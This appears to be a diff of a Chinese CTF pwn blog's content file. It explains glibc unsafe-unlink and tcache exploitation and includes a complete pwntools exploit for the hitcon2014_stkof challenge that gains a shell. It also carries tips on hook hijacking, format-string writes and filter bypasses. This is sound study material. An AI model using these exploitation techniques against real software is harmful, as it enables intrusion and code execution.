+</li>
+</ol>
+<h3 id="第一种思路"><a href="#第一种思路" class="headerlink" title="第一种思路"></a>第一种思路</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ol>
+<li>存在UAF可以修改P的fd和bk</li>
+<li>存在一个指针指向P</li>
+</ol>
+<h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><ol>
+<li>通过UAF漏洞修改chunk0-&gt;fd=G_ptr-0x18，chunk0-&gt;bk=G_ptr-0x10，绕过fd和bk检查</li>
+<li>free下一个chunk，chunk0和chunk1合并，chunk0发生unlink，修改了G_ptr的值</li>
+</ol>
+<h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><p>修改G_ptr=&amp;G_ptr-0x18。如果能够对G_ptr指向的空间进行修改，则可能导致任意地址读写。</p>
+<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/20201112000118623.png"><span class="image-caption">在这里插入图片描述</span></p>
+<h3 id="第二种思路"><a href="#第二种思路" class="headerlink" title="第二种思路"></a>第二种思路</h3><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><ol>
+<li>可以修改p的下一个chunk-&gt;pre_size和inuse位</li>
+<li>存在一个指针指向chunk p的内容部分</li>
+</ol>
+<h4 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h4><ol>
+<li><p>伪造fake_chunk：fakechunk-&gt;size=chunk0-0x10，可以绕过size检查</p>
+<p>fakechunk-&gt;fd=&amp;G_ptr-0x18，fakechunk-&gt;bk = &amp;G_ptr-&gt;0x10，绕过fd和bk检查</p>
+</li>
+<li><p>修改下一个chunk的prev_size=chunksize§-0x10。因为fakechunk比chunk0小0x10</p>
+</li>
+<li><p>修改下一个chunk的inuse位</p>
+</li>
+<li><p>free下一个堆块chunk1。fakechunk和chunk1合并，fakechunk发生unlink，修改了G_ptr的值</p>
+</li>
+</ol>
+<h4 id="效果-1"><a href="#效果-1" class="headerlink" title="效果"></a>效果</h4><p>修改G_ptr=&amp;G_ptr-0x18。如果能够对G_ptr指向的空间进行修改，则可能导致任意地址读写</p>
+<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/2020111123405646.png"><span class="image-caption">在这里插入图片描述</span></p>
+<h2 id="例题hitcon2014-stkof"><a href="#例题hitcon2014-stkof" class="headerlink" title="例题hitcon2014_stkof"></a>例题hitcon2014_stkof</h2><p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831204845498.png"><span class="image-caption">image-20210831204845498</span></p>
+<p>常规checksec一下，64位，开了NX、Canary</p>
+<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831211106261.png"><span class="image-caption">image-20210831211106261</span></p>
+<p>进入IDA，额，有个选项为4的功能似乎并没有作用，然后溢出点存在与修改函数中，对于我们能修改的长度是不存在什么限制的，所以能很轻易的造成堆溢出</p>
+<p>题目没开PIE，所以堆结构的地址是已知的，整个程序不存在打印功能。这边的思路是：</p>
+<p>先通过unlink把堆结构上的堆指针改为在堆结构前的地址，从而可以控制堆结构，达成任意写；然后先修改 <code>s[1] = free@got</code> 地址，同时修改 <code>s[2] = puts@got</code> 地址；再一次编辑，实现覆写free@got为puts@plt,从而当调用 free 函数时，即可直接调用 puts 函数。这样就可以泄漏函数内容。然后free(s[2])，相当于执行了puts（puts@got）通过puts泄露puts@got的值，获得libc基地址，然后就可以获得system；最后修改再把free@got修改为system，对着写有/bin/sh\x00的堆块释放</p>
+<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831213326412.png"><span class="image-caption">image-20210831213326412</span></p>
+<p>首先，这边第一个申请的chunk是不能被使用的，由于程序本身没有进行 setvbuf 操作，所以在执行输入输出操作的时候会申请缓冲区，所以我们在前面先分配一个 chunk 来把缓冲区分配完毕，以免影响之后的操作。具体的看ctfwiki这题的<a href="https://wiki.x10sec.org/pwn/linux/glibc-heap/unlink-zh/#io">IO 缓冲区问题分析</a>。所以第一个堆块不能用来做fakechunk</p>
+<p>所以这边进行创造fake_chunk要注意！首先，堆块的索引从1开始；其次第一个不能用，所以我们要从堆结构的第二个地方作为地址</p>
+<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831214046823.png"><span class="image-caption">image-20210831214046823</span></p>
+<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831214232302.png"><span class="image-caption">image-20210831214232302</span></p>
+<p>触发unlink，造成合并，同时堆结构指针的值被改为其地址 - 0x18</p>
+<p>然后就是按照思路所说的，去修改堆结构即可</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./stkof&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28635</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>	p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>free_got=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#4 防止合并</span><br>ptr = <span class="hljs-number">0x0000000000602150</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>) <span class="hljs-comment">#fake_chunk header</span><br>fake_chunk += p64(ptr - <span class="hljs-number">0x18</span>) + p64(ptr - <span class="hljs-number">0x10</span>) <span class="hljs-comment">#fake_chunk fd  bk</span><br>fake_chunk += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x80</span>) + p64(<span class="hljs-number">0x90</span>) <span class="hljs-comment">#fake prev_size size</span><br>edit(<span class="hljs-number">2</span>,fake_chunk)<br>free(<span class="hljs-number">3</span>)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(free_got) + p64(puts_got)<br>edit(<span class="hljs-number">2</span>,payload)<br>edit(<span class="hljs-number">1</span>,p64(puts_plt))<br>free(<span class="hljs-number">2</span>)<br>p.recv(<span class="hljs-number">0x20</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>edit(<span class="hljs-number">1</span>,p64(system))<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>free(<span class="hljs-number">4</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
 ]]></content>
       <tags>
         <tag>unlink</tag>
@@ -1137,18 +1538,19 @@
 <p>4、hook函数指针位置在<code>main_arena-0x10</code>处，在gdb中该地址的指令格式应为如此:<code>x/10gx (long long) &amp;main_arena-0x30</code></p>
 <p>5、chunk的size字段的最末位的三个比特位被用作状态标识，所以，size字段的以16进制表示时，最后一位16进制数是不能算到size里面的</p>
 <p>6、一个chunk的大小最小是0x20(32字节64位系统下)，或者0x10(16字节32位系统下)</p>
-<p>7、在Glibc2.26之后的版本出现了Tcache机制，在64位情况下，tcache优先于其他bin链接收释放掉的0×20<del>0×410大小的堆块（32位下0xC</del>0x200），tcache最多可以接收7个chunk，多出的部分将按照原来Glibc版本里面的方式分配。</p>
+<p>7、在Glibc2.26之后的版本出现了Tcache机制，在64位情况下，tcache优先于其他bin链接收释放掉的0×20<del>0×400大小的堆块（32位下0xC</del>0x200），tcache最多可以接收7个chunk，多出的部分将按照原来Glibc版本里面的方式分配。</p>
 <p>并且从tcache分配出去的chunk并不会检查被分配位置的size大小，也就是不必像之前的版本使用错位偏移来使size符合检查</p>
 <p>利用Tcache泄露libc有以下几种方法：</p>
 <ul>
 <li>申请8个大堆块，释放8个，这里堆块大小，大于fastbin范围，就是填满tcache，让第八个进入unsorted bin中</li>
-<li>有double free的情况下，连续free 8次同一个堆块，这里堆块大小，大于fastbin范围</li>
-<li>申请大堆块，大于0×410</li>
-<li>修改堆上的Tcache管理结构，把count值改为7，然后再次free一个该大小的chunk，注意防止chunk被top chunk合并</li>
+<li>有UAF的情况下，连续free 8次同一个堆块，这里堆块大小，大于fastbin范围</li>
+<li>申请大堆块，大于0×400</li>
+<li>修改堆上的Tcache管理结构，把count值改为7（count的值是有规律的，在Tcache里面，第一个字节存放的是0x20大小的堆块个数，每隔一个字节，堆块大小增加0x10），然后再次free一个该大小的chunk，注意防止chunk被top chunk合并</li>
 </ul>
 <p>以上都可以让chunk的fd和bk指针指向libc的某个位置而泄露地址</p>
-<p>8、当修改hook函数为one_gadget发现所有给的execve都不行时，这时需要我们借用__libc_realloc去调整栈的参数，使execve的环境被满足才可以利用成功。__libc_realloc的地址是__malloc_hook-0x8。因为调用realloc会执行许多的push指令，可以把rsp调整到满足环境。要查看push操作，可以把__libc_realloc地址加上n，指向的都是push指令</p>
-<p>操作：把one_gadget写到__relloc_hook地址上，在使用malloc函数的会进行调用；在__malloc_hook地址写上__libc_realloc+n(就会先执行__libc_realloc+n调整，再执行one_gadget)</p>
+<p>8、当修改hook函数为one_gadget发现所有给的execve都不行时，这时需要我们借用__libc_realloc去调整栈的参数，使execve的环境被满足才可以利用成功。__realloc_hook的地址是__malloc_hook-0x8。因为调用realloc会执行许多的push指令，可以把rsp调整到满足环境。要查看push操作，可以把__libc_realloc地址加上n，指向的都是push指令</p>
+<p>操作：把one_gadget写到__relloc_hook地址上，因为在使用malloc函数后面会调用到__relloc_hook；在__malloc_hook地址写上__libc_realloc+n(就会先执行__libc_realloc+n调整，再执行one_gadget)</p>
+<p>如果是使用realloc调整rsp，那只有realloc + 0x4的地址，存在着一条pop指令</p>
 <p>9、堆题libc都很重要,题目没给libc，如果存在double free，可以用其测试libc版本</p>
 <ul>
 <li>如果报fastbin double free 那就是2.23~2.26<ul>
@@ -1183,6 +1585,25 @@
 </ul>
 <p>20、绕过calloc的清空数据：把堆的is_mmap位置改为1，calloc将不会清空属于mmap的堆块数据</p>
 <p>顺序：释放==&gt;修改堆头==&gt;申请堆块</p>
+<p>21、<code>tcache_perthread_struct</code>这个结构体是可以释放的，并且可以将它释放到<code>unsorted bin</code>中去，然后分配这个<code>unsorted bin chunk</code>，可以控制任意地址分配堆内存</p>
+<p>22、当堆题中没有show功能时，要泄露出libc地址，需要借助stdout吐出libc地址</p>
+<p>需要把__libc_stdout上的值修改为<code>p64(0xfbad1800) + p64(0) * 3 + &#39;\x00&#39;</code></p>
+<p>23、当分配unsorted chunk时，如果剩下的块仍然大于0x80，并且还是唯一的，那这个新的unsorted chunkfd，bk指针仍然执行libc地址，并且分配出去的堆块，如果不是calloc或者执行了memset函数，那么上面将会存放着之前unsorted chunk的fd、bk指针</p>
+<p>24、libc-2.23.so时的fd，bk指针，指向的是堆块的prev_size位置，libc-2.27.so时的fd，bk指针指向的是堆块的内容（就是存放fd，bk指针的位置）比libc-2.23.so多了0x10</p>
+<p>25、利用exit_hook：劫持<code>_dl_rtld_lock_recursive</code>的值为one_gadget，当调用exit函数时可得到shell</p>
+<p><img src="/2021/04/18/2021-04-18-%E5%A0%86%E4%BA%8C%E4%B8%89%E4%BA%8B/image-20210903170451297.png"><span class="image-caption">image-20210903170451297</span></p>
+<p>在gdb中<code>p _rtld_global</code>可以找到这两个函数，但是要找到这个值所在地址，还需要在_rtld_global中寻找</p>
+<p><img src="/2021/04/18/2021-04-18-%E5%A0%86%E4%BA%8C%E4%B8%89%E4%BA%8B/image-20210903172330664.png"><span class="image-caption">image-20210903172330664</span></p>
+<p>libc-2.23.so:</p>
+<ul>
+<li>rtld_lock = libc_base + 0x5F0F48</li>
+<li>rtld_unlock = libc_base + 0x5F0F50</li>
+</ul>
+<p>libc-2.27.so:</p>
+<ul>
+<li>rtld_lock = libc_base + 0x619F60</li>
+<li>rtld_unlock = libc_base + 0x619F68</li>
+</ul>
 ]]></content>
       <tags>
         <tag>heap</tag>
@@ -2130,7 +2551,7 @@
     <title>缓冲区保护机制</title>
     <url>/2021/03/18/2021-03-18-%E7%BC%93%E5%86%B2%E5%8C%BA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
     <content><![CDATA[<p>为了更好地对缓冲区进行利用，十分有必要了解一下checksec所检查出的漏洞缓解措施都意味着什么</p>
-<p><img src="2021-03-18-%E7%BC%93%E5%86%B2%E5%8C%BA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6.assets/QQ%E5%9B%BE%E7%89%8720210319191658.png"></p>
+<p><img src="/2021/03/18/2021-03-18-%E7%BC%93%E5%86%B2%E5%8C%BA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/QQ%E5%9B%BE%E7%89%8720210319191658.png"></p>
 <p>如图上所示，RELRO、Stack、NX、PIE四种保护机制，下方介绍时，括号里的是在Windows系统中的名称</p>
 <p>以下主要来源于《从0到1CTFer成长之路》</p>
 <h3 id="一、NX-DEP"><a href="#一、NX-DEP" class="headerlink" title="一、NX(DEP)"></a>一、NX(DEP)</h3><p>NX即是No-execute，不可执行。原理是通过现代操作系统的内存保护单元机制（MPU）对程序内存按页的粒度进行权限设置，其基本规则为<strong>可写权限与可执行权限互斥</strong>。因此开启了NX的程序代表着堆栈上写入的代码数据将不可被执行，也就无法直接通过溢出写入shellcode而执行任意代码。</p>
@@ -2149,11 +2570,18 @@
 <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -fpic -pie -o test test.c<br></code></pre></td></tr></table></figure>
 
 <h3 id="四、Full-Relro"><a href="#四、Full-Relro" class="headerlink" title="四、Full Relro"></a>四、Full Relro</h3><p>Full Relro 保护措施与Linux下的Lazy Binding机制有关，主要作用是设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，禁止.GOT.PLT表和其他一些相关内存的读写，从而阻止攻击者直接进行修改程序所要执行的函数</p>
-<p>当只是开启了Partial RELRO，说明我们对GOT表具有写权限。</p>
+<ul>
+<li>RELRO防御策略：<ul>
+<li>为NO RELRO的时候，<code>init.array</code>、<code>fini.array</code>、<code>got.plt</code>均可读可写</li>
+<li>为PARTIAL RELRO的时候，<code>init.array</code>、<code>fini.array</code>可读不可写，<code>got.plt</code>可读可写</li>
+<li>为FULL RELRO时，<code>init.array</code>、<code>fini.array</code>、<code>got.plt</code>均可读不可写。</li>
+</ul>
+</li>
+</ul>
 <p>GCC开启Full Relro 的方法是加入**-z relro参数**</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -z relro -o test test.c<br></code></pre></td></tr></table></figure>
 
-<h3 id="五、Fortify"><a href="#五、Fortify" class="headerlink" title="五、Fortify"></a>五、Fortify</h3><p><img src="2021-03-18-%E7%BC%93%E5%86%B2%E5%8C%BA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6.assets/QQ%E5%9B%BE%E7%89%8720210319191855.png"></p>
+<h3 id="五、Fortify"><a href="#五、Fortify" class="headerlink" title="五、Fortify"></a>五、Fortify</h3><p><img src="/2021/03/18/2021-03-18-%E7%BC%93%E5%86%B2%E5%8C%BA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/QQ%E5%9B%BE%E7%89%8720210319191855.png"></p>
 <p>这部分转载自<a href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">http://yunnigu.dropsec.xyz/2016/10/08/checksec及其包含的保护机制/</a></p>
 <p>FORTIFY_SOURCE 机制对格式化字符串有两个限制</p>
 <p> （1）包含%n的格式化字符串不能位于程序内存中的可写地址。</p>
@@ -2363,7 +2791,7 @@
 <li>后续参数，就是下图中逗号后的变量（可以不要）</li>
 </ul>
 <p>上述可转为该图：</p>
-<p><img src="2020-12-05-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E.assets/printf.png"></p>
+<p><img src="/2020/12/05/2020-12-05-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/printf.png"></p>
 <p>将相关正式概念代入图片更好理解</p>
 <h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p>输入：</p>
 <ul>
@@ -2433,7 +2861,7 @@
 <ul>
 <li><p>printf函数的字符串漏洞</p>
 <p>此漏洞如（来自攻防世界的CGfsb）：</p>
-<p><img src="2020-12-05-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E.assets/QQ%E5%9B%BE%E7%89%8720201205111442-1607139495232.png"></p>
+<p><img src="/2020/12/05/2020-12-05-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/QQ%E5%9B%BE%E7%89%8720201205111442-1607139495232.png"></p>
 </li>
 </ul>
 <p>在格式化字符串函数中%n，作用是把在%n前输出的字符个数赋值给对应的整型指针参数所指的变量</p>
@@ -2456,7 +2884,7 @@
 </ul>
 <p>把格式化的数据写入某个字符串缓冲区。如果成功，则返回写入的字符总数（不包括’\0’），不包括字符串追加在字符串末尾的空字符。如果失败，则返回一个负数。</p>
 <h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="x86系统下："><a href="#x86系统下：" class="headerlink" title="x86系统下："></a>x86系统下：</h3><p>以printf为例</p>
-<p><img src="2020-12-05-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E.assets/printf-1608199588168.png"></p>
+<p><img src="/2020/12/05/2020-12-05-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/printf-1608199588168.png"></p>
 <p>假设printf函数将以图中方式进行输出。那么作为一个函数，首先就是将参数入栈，又按照从右到左的方式。那么将按以下的情况入栈：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">3.14<br>123456<br>addr of &quot;red&quot;<br>addr of format string: Color %s，Number %d，Float %4.2f<br></code></pre></td></tr></table></figure>
 
@@ -2482,7 +2910,7 @@
 <li><p>%f解析内容对应的浮点值</p>
 <p>第一个，注意！解析地址！如果是一个无法访问的地址比如0，那么程序将崩溃，这也是我们利用的点，比如注入不限量个%s，总有一个能让程序崩溃的。而其余两个我们也可以借此而使得栈上的内容泄露出来</p>
 <p>这里补充一点：我们是可以获取栈中被视为第n+1个参数的值方法为：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">%n$x<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">%n$p<br></code></pre></td></tr></table></figure>
 
 <p>n代表该格式化字符串对应的第n个输出参数，那相对于输出函数来说，就是第n+1个参数了。</p>
 <h3 id="x64系统下："><a href="#x64系统下：" class="headerlink" title="x64系统下："></a>x64系统下：</h3><p>原理与x86并无不同，唯一需要注意的就是x64系统下，函数的前六位参数是使用寄存器存放的，顺序为RDI,RSI,RDX,RCX,R8,R9对应前六位参数，所以在gdb中相对偏移时，要把栈上的偏移加上相差寄存器的数量的才是n的值</p>
@@ -2675,7 +3103,7 @@
 <li><p>使用：一般用到dump这个用法，其他详细用法可见上面github。</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">seccomp-tools dump ./xxx<br></code></pre></td></tr></table></figure></li>
 </ul>
-<h2 id="libc-database"><a href="#libc-database" class="headerlink" title="libc database"></a>libc database</h2><p>有一些PWN题故意不给libc文件，但是可以泄露地址，libc database可以利用泄露的地址来确定服务器使用的libc。</p>
+<h2 id="libc-database"><a href="#libc-database" class="headerlink" title="libc_database"></a>libc_database</h2><p>有一些PWN题故意不给libc文件，但是可以泄露地址，libc database可以利用泄露的地址来确定服务器使用的libc。</p>
 <p>先下载libc database</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git clone https://github.com/niklasb/libc-database<br></code></pre></td></tr></table></figure>
 
@@ -2733,25 +3161,26 @@
 <p>9、劫持栈帧到.bss段上时，要注意一下是否可能会将.got.plt表覆盖，导致程序无法正常执行</p>
 <p>10、承接第4点吧，我们避免输入\x00导致程序截断，同时也要注意程序是否自身有着\x00，导致了截断</p>
 <p>11、遇到strcat、strcpy、strcmp、strlen等函数的阻碍时，由于这些函数遇到’\0’将会停止，那么只要将其中的某个变量的第一个字符设为’\0’即可快速简单的绕过这些函数</p>
-<p>12、当用puts函数泄露got表的地址，使用u64解包时，由于u64解包的条件是需要字符串的长度为8个字节，而地址的长度顶多6个字节那么长（高地址填充0，但是我们并不能接收到），此时就需要使用这样的形式进行接收：<strong>u64(p.recv(6).ljust(8,’\0’))</strong>  （’\0’写成’\x00’也行，毕竟在内存中存储情况是一样的还有**u64(io.recvuntil(‘\x7f’).ljust(8,’\x00’))**）</p>
+<p>12、当用puts函数泄露got表的地址，使用u64解包时，由于u64解包的条件是需要字符串的长度为8个字节，而地址的长度顶多6个字节那么长（高地址填充0，但是我们并不能接收到），此时就需要使用这样的形式进行接收：<strong>u64(p.recv(6).ljust(8,’\0’))</strong>  （’\0’写成’\x00’也行，毕竟在内存中存储情况是一样的还有**u64(p.recvuntil(‘\x7f’).ljust(8,’\x00’))**）</p>
 <p>13、一个大多数人应该都有错误的认知：认为溢出只要到如gets函数就能实现溢出了，所以下面的代码就不用看，这是绝对错误的！首先，我们通过栈溢出改变的只是返回地址的内容，想要到达返回地址，整个的函数执行流必须进行完，才会发生退栈，从而利用返回地址，所以下方的代码也要处理</p>
 <p>14、执行strcmp、strncmp、strcasecmp的时候，rdx会被设置为将要被比较的字符串的长度</p>
 <p>15、system的参数不一定是要/bin/sh才可以，只有sh也是可以的。而且sh可以从fflush()这个函数中获取，直接查找ida或者ROPgadget –binary 文件名 –string ‘sh’查询（不一定都能成功）</p>
 <p>16、当远程docker过滤空格和cat时，将无法使用cat flag获取到flag，此时我们可以用<strong>more&lt;flag或者base64&lt;flag</strong>获取flag，其中的&lt;可以代替空格的功能，第一个<strong>more&lt;flag</strong> 与cat一样都是输出文件内容，而base64是把flag的内容转换成base64编码</p>
 <p>17、64位的文件有时候不一定会存在rbp的调用，不存在leave指令，这时候我们只需要去关注rsp的位置即可，因为ret指令代表着pop rip，把栈顶的内容弹出给rip，所以锁定rsp的位置，就可以劫持rip</p>
 <p>18、有时候在我们输入时，无法通过recvuntil去卡到输入的点，可以使用sleep()函数，让线程休眠，让对面的程序跑到我们要到点，再进行输入，方可利用成功（个人猜测）</p>
-<p>19、64位下的linux的系统调用号（使用syscall调用，调用号是保存到rax中）：</p>
+<p>19、64位下的linux的系统调用号（使用syscall调用，调用号是保存到rax中,函数传参依次存入RDI,RSI,RDX,RCX,R8,R9）</p>
 <p><strong>0(0x0) sys_read</strong></p>
 <p><strong>1(0x1) sys_write</strong></p>
 <p><strong>2(0x2)sys_open</strong></p>
 <p><strong>3(0x3)sys_close</strong></p>
 <p><strong>9(0x9)sys_mmap</strong></p>
-<p><strong>37(0x25)sys_alarm</strong></p>
 <p><strong>15(0xF) sys_rt_sigreturn</strong></p>
+<p><strong>37(0x25)sys_alarm</strong></p>
 <p><strong>59(0x3B) sys_execve</strong></p>
 <p><strong>60(0x3C)sys_exit</strong></p>
 <p><strong>62(0x3E)sys_kill</strong></p>
-<p>32位下linux系统调用号（使用syscall，调用号保存在eax中），函数其他参数依次存入ebx，ecx，edx中</p>
+<p>32位下linux系统调用号（使用int 80h，调用号保存在eax中，执行完函数的返回值也保存在eax里面），函数其他参数依次存入ebx，ecx，edx中</p>
+<p><strong>1(0x1)sys_exit</strong></p>
 <p><strong>3(0x3)sys_read</strong></p>
 <p><strong>4(0x4)sys_write</strong></p>
 <p><strong>5(0x5)sys_open(文件名,0,0)</strong></p>
@@ -2759,18 +3188,39 @@
 <p>20、使用<strong>execve</strong>获取shell时，其参数要设置为<code>execve(&quot;/bin/sh&quot;,0,0)</code></p>
 <p>21、劫持rip时，如果觉得在ida中的栈查看覆盖偏移量是对的，却没能获取shell时，去看看汇编代码，可能这时候出题人故意设置了返回代码不是平常的 leave  ret这两个，被修改为其他的代码了，导致退栈时候rsp指向地方的不是在rbp的下面，这时候我们要去gdb里面下断点在返回的指令前，查看rbp具体指向的地方</p>
 <p>22、<strong>gdb 文件名 core</strong>可以调试程序中断而生成的核心转储文件，进行深入查看中断原因 </p>
-<p>23、当题目已给出libc时，可以直接用libc显示出函数在其内的偏移地址，命令格式如下：</p>
+<p>23、当题目已给出libc时，可以直接用libc显示出函数在其内的偏移地址，命令格式如下：（也可以直接调用libc文件，libc = ELF(“./文件名”)）</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">objdump -T ./libc-2.23.so | grep system #显示system的libc地址<br></code></pre></td></tr></table></figure>
 
 <p><img src="/2020/11/22/2020-11-22-%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%A7%A3%E9%A2%98%E4%BA%8C%E4%B8%89%E4%BA%8B/QQ%E5%9B%BE%E7%89%8720210510214657.png"></p>
 <p>24、静态链接题目多半考虑ret2syscall，或者看有没有mprotect函数，修改段的执行权限，注入shellcode</p>
 <p>25、libc中environ存储了栈上环境变量的特性，可以利用这个特效来泄露出栈上的地址，写为这样libc.sym[“environ”]</p>
 <p>26、scanf读取过长的输入时会使用malloc_hook分配chunk，也就是可以借此如果能修改__malloc_hook为one_gadget的话，就能getshell</p>
-<p>27、got表劫持：常见劫持put(buf)、free(buf)、atoi(buf)、atol(buf)</p>
+<p>27、got表劫持：常见劫持put(buf)、free(buf)、atoi(buf)、atol(buf)、strlen(buf)</p>
 <p>28、当scanf的参数不是%s时候，是u，d等数字，输入数字是使用str()即可，不用p64()。</p>
 <p>因为输入数字是就是使用数字输入，如果使用了p64()将会变成字符数字</p>
-<p>29、使用execv(“/bin/sh”,0)getshell需要两个参数</p>
+<p>29、使用execv(“/bin/sh”,0)getshell需要两个参数,比execve少一个</p>
 <p>另外：2.29之后的libc直接调用system会出问题</p>
+<p>30、碰到静态编译的题目时，有两种方法：</p>
+<ul>
+<li><p>使用ROPgadget内置的功能，可以自动生成rop链，调用系统函数getshell，命令：</p>
+<p><code>ROPgadget --binary 文件名 --ropchain</code></p>
+</li>
+<li><p>使用mprotect函数修改.bss段执行权限，把shellcode写入.bss段中执行而getshell</p>
+</li>
+</ul>
+<p>31、格式化字符串漏洞：当要往某个地址上写入地址时，格式为：目标addr + ‘%’ + str(addr - 已写的长度) + “c%a(a是偏移量)$hn” 这边一般使用hn写两个字节，或者hhn写一个字节，这样不容易造成timeout，当然前提是格式化漏洞给的长度够长</p>
